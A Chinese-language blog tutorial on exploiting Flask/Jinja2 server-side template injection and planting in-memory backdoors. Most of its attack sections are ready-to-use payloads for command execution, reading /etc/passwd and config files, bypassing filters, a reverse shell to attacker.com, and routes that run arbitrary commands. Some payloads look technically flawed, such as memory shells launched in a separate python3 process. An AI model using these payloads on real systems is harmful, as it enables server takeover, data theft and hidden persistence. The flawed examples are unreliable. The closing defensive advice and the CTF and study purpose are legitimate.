---
layout: post
title: "Flask SSTI与内存马完全指南：从入门到实战"
date: 2026-04-20 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [Flask, SSTI, 内存马, Jinja2, Python安全, 模板注入, 无文件后门, Web安全]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [前言](#前言)
- [什么是SSTI](#什么是ssti)
- [Flask与Jinja2基础](#flask与jinja2基础)
- [SSTI漏洞原理详解](#ssti漏洞原理详解)
- [Python魔术方法在SSTI中的利用](#python魔术方法在ssti中的利用)
- [SSTI漏洞检测与利用](#ssti漏洞检测与利用)
- [什么是内存马](#什么是内存马)
- [Flask内存马原理](#flask内存马原理)
- [Flask内存马类型与构造](#flask内存马类型与构造)
- [实战案例演示](#实战案例演示)
- [防御措施](#防御措施)
- [总结与学习资源](#总结与学习资源)

---

## 前言

在学习Web安全的过程中，**SSTI（服务器端模板注入）** 是一个既重要又充满挑战的知识点。而对于使用Python Flask框架开发的应用来说，SSTI漏洞往往意味着可以直接获取服务器权限。更进一步，通过SSTI漏洞，攻击者还可以植入**内存马**——一种更难被发现的无文件后门。

本文将从零开始，用通俗易懂的语言和丰富的示例，带你全面理解Flask SSTI漏洞的原理、利用方法，以及内存马的构造技巧。无论你是安全新手还是CTF爱好者，相信都能从中有所收获。

---

## 什么是SSTI

### SSTI概念

**SSTI（Server-Side Template Injection，服务器端模板注入）** 是一种Web安全漏洞，攻击者能够在服务器端注入恶意模板代码，导致服务器执行任意代码、读取敏感文件或执行其他恶意操作。

简单来说，就是攻击者把**恶意代码**当成**模板代码**交给了服务器，服务器在执行模板渲染时，把攻击者的代码也执行了。

### SSTI与其他漏洞的区别

| 漏洞类型 | 执行位置 | 影响范围 | 危害程度 |
|---------|---------|---------|---------|
| **XSS** | 客户端（浏览器） | 影响当前用户 | 中 |
| **SQLi** | 数据库服务器 | 数据库数据 | 高 |
| **SSTI** | 应用服务器 | 整个服务器 | 极高 |

### SSTI的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 远程代码执行（RCE） | 在服务器上执行任意系统命令 |
| 敏感信息泄露 | 读取配置文件、环境变量、源代码 |
| 文件读写 | 读取任意文件、写入WebShell |
| 内网渗透 | 利用服务器作为跳板攻击内网 |
| 权限提升 | 获取服务器更高权限 |
| 植入内存马 | 在内存中植入无文件后门 |

### 常见存在SSTI的场景

1. **用户资料页面**：允许用户自定义模板格式的个人主页
2. **邮件模板系统**：使用模板引擎渲染邮件内容
3. **报表生成系统**：动态生成PDF、Excel等报表
4. **CMS系统**：内容管理系统中的模板编辑功能
5. **在线代码编辑器**：支持模板语法的在线工具
6. **日志查看器**：格式化显示日志内容

---

## Flask与Jinja2基础

### Flask框架简介

**Flask** 是一个使用Python编写的轻量级Web应用框架。它被称为"微框架"，因为核心功能简洁，但可以通过扩展实现复杂功能。

Flask默认使用 **Jinja2** 作为模板引擎，这是Python最流行的模板引擎之一。

### Jinja2模板引擎工作原理

模板引擎的工作流程可以用下图表示：

```
模板文件 + 数据 → 模板引擎 → 最终输出
```

**正常使用的例子：**

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # 使用模板字符串渲染
    template = '<h1>Hello, {{ name }}!</h1>'
    return render_template_string(template, name=name)
```

当访问 `/hello/Alice` 时，输出：

```html
<h1>Hello, Alice!</h1>
```

### Jinja2基础语法

{% raw %}
```jinja2
{{ variable }}           {# 变量输出 #}
{{ variable|filter }}    {# 过滤器 #}
{% if condition %}       {# 控制结构 #}
{% for item in items %}
```
{% endraw %}

---

## SSTI漏洞原理详解

### 漏洞产生原因

SSTI漏洞产生的根本原因是**应用程序对用户输入的数据没有进行充分的验证和过滤**，直接将用户输入作为模板代码执行。

#### 漏洞代码示例

**存在漏洞的Flask代码：**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 危险：直接使用用户输入拼接模板
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)
```

**攻击方式：**

正常请求：
```
http://example.com/greet?name=Alice
```

恶意请求：
```
http://example.com/greet?name={{7*7}}
```

如果页面显示 `49` 而不是 `{{7*7}}`，说明模板表达式被执行，存在SSTI漏洞！

#### 安全代码示例

```python
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 安全：对用户输入进行转义
    safe_name = escape(name)
    template = '<h1>Hello, {{ name }}!</h1>'
    return render_template_string(template, name=safe_name)
```

### SSTI攻击流程

```
发现注入点 → 识别模板引擎 → 构造Payload → 利用漏洞 → 获取服务器权限
```

---

## Python魔术方法在SSTI中的利用

在Python SSTI攻击中，我们需要利用Python的**魔术方法（Magic Methods）** 来构造利用链。这些以双下划线开头和结尾的方法，是Python对象的内置属性。

### 核心魔术方法详解

#### 1. `__class__` - 获取对象所属类

```python
# 在Python中
"hello".__class__  # 输出: <class 'str'>
().__class__       # 输出: <class 'tuple'>
```

**SSTI中的用法：**

{% raw %}
```jinja2
{{ ''.__class__ }}        {# 获取字符串类 #}
{{ ().__class__ }}        {# 获取元组类 #}
```
{% endraw %}

#### 2. `__base__` / `__bases__` - 获取基类

```python
# 在Python中
"hello".__class__.__base__  # 输出: <class 'object'>
```

**SSTI中的用法：**

{% raw %}
```jinja2
{{ ''.__class__.__base__ }}     {# 获取str的基类: object #}
{{ ().__class__.__bases__[0] }} {# 获取tuple的基类: object #}
```
{% endraw %}

#### 3. `__mro__` - 方法解析顺序

`__mro__` 返回一个包含类及其所有基类的元组。

{% raw %}
```jinja2
{{ ''.__class__.__mro__ }}      {# 查看str类的继承链 #}
{{ ''.__class__.__mro__[1] }}   {# 获取object类 #}
```
{% endraw %}

#### 4. `__subclasses__()` - 获取所有子类

这是SSTI利用中最关键的一步！`object`类的所有子类都可以通过这个方法获取，其中往往包含可以执行命令的类。

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}  {# 列出所有子类 #}
```
{% endraw %}

#### 5. `__init__` - 构造函数

用于访问类的初始化方法。

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__ }}
```
{% endraw %}

#### 6. `__globals__` - 全局变量

访问函数的全局命名空间，通常包含 `__builtins__`。

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__ }}
```
{% endraw %}

#### 7. `__builtins__` - 内置函数

包含Python的所有内置函数，如 `eval`、`exec`、`__import__` 等。

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__'] }}
```
{% endraw %}

### 完整利用链构造

让我们一步步构造一个执行系统命令的Payload：

**第一步：获取object类**

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1] }}
```
{% endraw %}

**第二步：获取所有子类**

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
{% endraw %}

**第三步：找到包含os模块的子类**

通常 `warnings.catch_warnings` 类（索引约132）包含 `os` 模块：

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132] }}
```
{% endraw %}

**第四步：访问全局变量获取os模块**

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'] }}
```
{% endraw %}

**第五步：执行系统命令**

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}
```
{% endraw %}

### 利用链原理图解

```
字符串 ''
    ↓ __class__
<class 'str'>
    ↓ __mro__[1]
<class 'object'>
    ↓ __subclasses__()[132]
<class 'warnings.catch_warnings'>
    ↓ __init__.__globals__
{..., 'os': <module>, '__builtins__': {...}, ...}
    ↓ ['os'].popen('id').read()
执行结果: uid=33(www-data) gid=33(www-data)...
```

---

## SSTI漏洞检测与利用

### 漏洞检测方法

#### 1. 数学运算测试

最简单的检测方式：

{% raw %}
```
{{7*7}}     → 如果返回49，存在SSTI
${7*7}      → Freemarker语法
#{7*7}      → 其他模板引擎
```
{% endraw %}

#### 2. 字符串拼接测试

{% raw %}
```
{{'7'*7}}   → 返回'7777777'
```
{% endraw %}

#### 3. 识别模板引擎

不同模板引擎有不同的特征：

| 模板引擎 | 检测Payload | 预期输出 |
|---------|------------|---------|
| Jinja2 | `{{7*7}}` | 49 |
| Twig | `{{7*7}}` | 49 |
| Smarty | `{7*7}` | 49 |
| Freemarker | `${7*7}` | 49 |
| Velocity | `$class` | - |
| Django | `{{7|add:7}}` | 14 |

### 基础利用Payload

#### 信息收集

{% raw %}
```jinja2
{{ config }}                                      {# 查看Flask配置 #}
{{ request.headers }}                             {# 查看请求头 #}
{{ request.args }}                                {# 查看GET参数 #}
{{ request.form }}                                {# 查看POST参数 #}
{{ request.cookies }}                             {# 查看Cookie #}
{{ request.environ }}                             {# 查看环境变量 #}
{{ url_for.__globals__ }}                         {# 查看全局变量 #}
```
{% endraw %}

#### 系统命令执行

**方法1：使用os模块**

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
```
{% endraw %}

**方法2：使用subprocess模块**

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['whoami']) }}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').call(['ls', '-la']) }}
```
{% endraw %}

**方法3：使用魔术方法链**

{% raw %}
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```
{% endraw %}

**方法4：使用lipsum对象（绕过某些限制）**

{% raw %}
```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
```
{% endraw %}

**方法5：使用url_for**

{% raw %}
```jinja2
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('subprocess').check_output(['cat','/etc/passwd']) }}
```
{% endraw %}

#### 文件读取

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ url_for.__globals__['__builtins__']['open']('app.py').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['open']('config.py').read() }}
```
{% endraw %}

#### 反弹Shell

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read() }}
```
{% endraw %}

### 进阶利用技巧

#### 1. 关键字过滤绕过

**过滤 `__class__`：**

{% raw %}
```jinja2
{# 使用attr过滤器 #}
{{ ()|attr("\x5f\x5fclass\x5f\x5f") }}
{{ ()|attr("__"+"class"+"__") }}

{# 使用__getattribute__ #}
{{ ().__getattribute__("__class__") }}
```
{% endraw %}

**过滤 `os`：**

{% raw %}
```jinja2
{# 使用subprocess代替 #}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['id']) }}

{# 使用pty #}
{{ self.__init__.__globals__.__builtins__.__import__('pty').spawn('/bin/sh') }}
```
{% endraw %}

**过滤 `import`：**

{% raw %}
```jinja2
{# 使用__builtins__的其他方式 #}
{{ self.__init__.__globals__.__builtins__.exec("import os; print(os.system('id'))") }}
```
{% endraw %}

#### 2. 沙箱绕过

当Jinja2启用沙箱模式时：

{% raw %}
```jinja2
{# 使用tuple类 #}
{{ ().__class__.__bases__[0].__subclasses__() }}

{# 查找包含os的类 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}

{# 使用warnings模块 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['warnings'].warn.__globals__['os'].popen('id').read() }}
```
{% endraw %}

#### 3. 使用编码绕过

{% raw %}
```jinja2
{# 使用十六进制编码 #}
{{ ()|attr("\x5f\x5fclass\x5f\x5f") }}

{# 使用Unicode编码 #}
{{ ()|attr("\u005f\u005fclass\u005f\u005f") }}
```
{% endraw %}

---

## 什么是内存马

### 内存马概念

**内存马**（Memory Shell）是一种无文件后门技术，攻击者通过漏洞将恶意代码直接注入到应用程序的内存中，而不需要在磁盘上写入任何文件。

### 内存马与传统WebShell的区别

| 特性 | 传统WebShell | 内存马 |
|------|-------------|--------|
| **存储位置** | 磁盘文件 | 内存中 |
| **持久性** | 文件一直存在 | 服务重启后消失 |
| **检测难度** | 容易被杀毒软件/EDR检测 | 难以检测 |
| **取证难度** | 可提取文件分析 | 内存取证困难 |
| **部署方式** | 文件上传/写入 | 代码注入 |

### 内存马的优势

1. **无文件落地**：不写入磁盘，绕过基于文件的检测
2. **隐蔽性强**：存在于内存中，常规扫描难以发现
3. **动态执行**：可以动态修改，灵活度高

---

## Flask内存马原理

### Flask路由机制解析

Flask的路由本质是**URL路径与视图函数的映射关系**。当请求到达时，Flask会根据URL找到对应的视图函数执行。

核心数据结构：

```python
# Flask内部使用Werkzeug的Map存储路由
self.url_map = Map()

# 路由规则
Rule('/hello', endpoint='hello', methods=['GET'])
```

### 动态路由注册原理

Flask提供了 `add_url_rule` 方法，可以在运行时动态添加路由：

```python
app.add_url_rule('/new_route', 'endpoint_name', view_function)
```

参数说明：
- **rule**: URL规则，必须以 `/` 开头
- **endpoint**: 端点名称，用于反向解析URL
- **view_func**: 视图函数，处理请求的函数

### 内存驻留机制

当通过SSTI漏洞执行代码时，我们可以：

1. 获取Flask应用实例
2. 使用 `add_url_rule` 注册新的路由
3. 新路由对应的恶意函数存储在内存中
4. 后续可以通过访问该路由执行任意操作

---

## Flask内存马类型与构造

### 类型一：基于路由注册的内存马

这是最直接的内存马构造方式，通过注册一个新的路由来实现后门功能。

#### 构造原理

```python
# 获取Flask应用实例
app = current_app

# 定义恶意视图函数
def shell():
    import os
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()

# 注册新路由
app.add_url_rule('/shell', 'shell', shell)
```

#### SSTI Payload

{% raw %}
```jinja2
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('echo "import os; from flask import request, current_app; app = current_app._get_current_object(); exec(\'def shell(): cmd = request.args.get(\\'cmd\\'); return os.popen(cmd).read()\'); app.add_url_rule(\\'/shell\\', \\'shell\\', shell)" > /tmp/mem.py && python3 /tmp/mem.py').read() }}
```
{% endraw %}

**更简洁的Payload：**

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "from flask import current_app, request; app = current_app._get_current_object(); app.add_url_rule(\"/shell\", \"shell\", lambda: __import__(\"os\").popen(request.args.get(\"cmd\")).read())"').read() }}
```
{% endraw %}

#### 使用方法

1. 通过SSTI注入上述Payload
2. 访问 `/shell?cmd=id` 执行命令
3. 访问 `/shell?cmd=cat /flag` 读取flag

### 类型二：基于异常处理的内存马（Debug模式）

当Flask开启Debug模式时，可以利用异常处理机制植入内存马。

#### 构造原理

```python
# 在before_request钩子中植入代码
@app.before_request
def before_request():
    # 恶意代码
    pass
```

#### SSTI Payload

{% raw %}
```jinja2
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('python3 -c "
from flask import current_app, request
app = current_app._get_current_object()

def mem_shell():
    cmd = request.args.get(\'cmd\')
    if cmd:
        return __import__(\'os\').popen(cmd).read()
    return \"Memory Shell Active\"

app.before_request_funcs.setdefault(None, []).append(mem_shell)
"').read() }}
```
{% endraw %}

### 类型三：基于模板上下文的内存马

利用模板渲染时的上下文注入，在每次渲染时执行恶意代码。

#### 构造原理

通过修改Jinja2环境，添加全局函数：

```python
# 向Jinja2环境添加恶意函数
app.jinja_env.globals['shell'] = lambda cmd: os.popen(cmd).read()
```

#### SSTI Payload

{% raw %}
```jinja2
{{ url_for.__globals__['current_app'].jinja_env.globals.update({'shell': lambda x: __import__('os').popen(x).read()}) }}
```
{% endraw %}

---

## 实战案例演示

### 案例1：SSTI获取RCE

#### 环境搭建

**vulnerable_app.py:**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    template = f'''
    <h1>Welcome!</h1>
    <p>Hello, {name}!</p>
    '''
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

#### 漏洞发现

1. 访问 `http://localhost:5000/?name={{7*7}}`
2. 页面显示 `49`，确认存在SSTI

#### 利用过程

**步骤1：信息收集**

```
http://localhost:5000/?name={{config}}
```

获取Flask配置信息。

**步骤2：执行命令**

```
http://localhost:5000/?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

返回：
```
uid=1000(user) gid=1000(user) groups=1000(user)
```

**步骤3：读取敏感文件**

```
http://localhost:5000/?name={{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
```

### 案例2：植入内存马

#### 注入内存马

使用以下Payload植入内存马：

{% raw %}
```
http://localhost:5000/?name={{url_for.__globals__['__builtins__']['__import__']('os').popen("python3 -c \"exec(\\\"from flask import current_app, request\\napp = current_app._get_current_object()\\ndef shell():\\n    cmd = request.args.get('cmd')\\n    if cmd:\\n        return __import__('os').popen(cmd).read()\\n    return 'OK'\\napp.add_url_rule('/mem', 'mem', shell)\\\"\")").read()}}
```
{% endraw %}

#### 使用内存马

1. 访问 `http://localhost:5000/mem?cmd=whoami`
2. 返回执行结果

#### 验证内存马

内存马存在于内存中，即使删除原始漏洞文件，内存马仍然有效，直到服务重启。

---

## 防御措施

### 1. 输入验证和过滤

#### 白名单验证

```python
import re
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 只允许字母、数字和空格
    if not re.match(r'^[a-zA-Z0-9\s]+$', name):
        return 'Invalid name', 400
    template = '<h1>Hello, {{ name }}!</h1>'
    return render_template_string(template, name=name)
```

#### 转义特殊字符

```python
from markupsafe import escape

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 转义HTML特殊字符
    safe_name = escape(name)
    return f'<h1>Hello, {safe_name}!</h1>'
```

### 2. 使用安全的模板渲染方式

#### 分离模板和数据

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 使用模板文件，不直接拼接
    return render_template('greet.html', name=name)
```

**greet.html:**

{% raw %}
```html
<h1>Hello, {{ name }}!</h1>
```
{% endraw %}

#### 使用自动转义

```python
from jinja2 import Environment, PackageLoader, select_autoescape

env = Environment(
    loader=PackageLoader('yourapp'),
    autoescape=select_autoescape(['html', 'xml'])
)
```

### 3. 沙箱化执行环境

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
result = template.render()
```

### 4. 最小权限原则

- 以非root用户运行应用
- 限制文件系统访问权限
- 使用chroot或容器隔离
- 限制出站网络连接

### 5. 安全开发最佳实践

#### 安全编码检查清单

- [ ] 永远不要直接拼接用户输入到模板
- [ ] 对所有用户输入进行验证和过滤
- [ ] 使用模板引擎的自动转义功能
- [ ] 在沙箱环境中执行用户提供的模板
- [ ] 限制模板可访问的对象和方法
- [ ] 定期进行安全审计和代码审查
- [ ] 使用静态代码分析工具
- [ ] 及时更新模板引擎到最新版本

---

## 总结与学习资源

### 知识点回顾

本文从以下几个方面全面介绍了Flask SSTI与内存马：

1. **SSTI基础**：理解服务器端模板注入的概念和危害
2. **Python魔术方法**：掌握`__class__`、`__bases__`、`__subclasses__`等核心方法的利用
3. **漏洞利用**：学会构造Payload进行信息收集、命令执行和文件读取
4. **内存马技术**：理解无文件后门的原理和构造方法
5. **防御措施**：掌握输入验证、沙箱化等防御手段

### 推荐学习资源

#### 官方文档

- [Jinja2官方文档](https://jinja.palletsprojects.com/)
- [Flask官方文档](https://flask.palletsprojects.com/)
- [OWASP SSTI](https://owasp.org/www-community/vulnerabilities/Server-Side_Template_Injection)

#### 在线教程

- [PortSwigger Web Security Academy - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Hello CTF - SSTI注入](https://hello-ctf.com/hc-web/ssti/)

#### 工具推荐

| 工具 | 用途 | 链接 |
|------|------|------|
| Tplmap | SSTI自动化检测和利用 | https://github.com/epinna/tplmap |
| SSTImap | SSTI检测工具 | https://github.com/vladko312/SSTImap |
| Fenjing | 中文SSTI利用工具 | https://github.com/Marven11/Fenjing |

#### CTF练习平台

- [CTFShow](https://ctf.show/) - 国内优质CTF练习平台
- [Bugku](https://ctf.bugku.com/) - Web题目丰富
- [攻防世界](https://adworld.xctf.org.cn/) - XCTF联赛平台

### 安全提醒

> **本文仅供学习交流使用，请勿用于非法用途。**
> 
> 进行安全测试时，请确保已获得目标系统的合法授权。未经授权的渗透测试行为可能违反法律法规。

---

*本文最后更新于：2026年4月20日*
